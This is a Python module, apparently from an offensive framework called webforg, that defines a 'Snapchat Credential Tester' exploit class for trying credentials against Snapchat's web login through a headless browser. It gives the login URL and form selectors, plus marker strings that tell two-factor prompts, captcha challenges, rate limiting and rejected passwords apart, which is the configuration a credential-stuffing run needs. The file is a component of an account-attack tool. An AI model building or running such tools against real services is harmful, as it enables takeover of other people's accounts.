"""Snapchat Credential Tester — headless-browser login flow."""
from webforg.modules.auth.base_login_tester import BaseSocialLoginTester


class Exploit(BaseSocialLoginTester):
    name = "Snapchat Credential Tester"
    description = "Tests credentials against Snapchat's web login via a headless browser."
    author = "K0uR1i"
    rank = "manual"

    platform_name = "snapchat"
    browser_login_url = "https://accounts.snapchat.com/accounts/v2/login"
    username_selector = "input[name=accountIdentifier]"
    username_submit_selector = "button[type=submit]"
    password_selector = "input[name=password]"
    page_load_timeout_ms = 35000
    browser_login_paths = ("/v2", "/accounts")
    twofa_markers = (
        "two-factor", "two factor", "2fa", "verification code", "enter the code",
        "confirm it's you",
    )
    challenge_markers = (
        "captcha", "security check", "unusual activity", "are you a robot",
        "confirm it's you", "verify it's you", "performing security verifications",
        "verifying your request", "please wait while we perform",
    )
    rate_markers = (
        "too many attempts", "try again later", "temporarily", "rate limit",
        "you've been locked", "try again in",
    )
    invalid_markers = (
        "please check your username and password", "incorrect password",
        "wrong password", "invalid credentials", "doesn't look right",
        "invalid username or password", "account not found",
    )
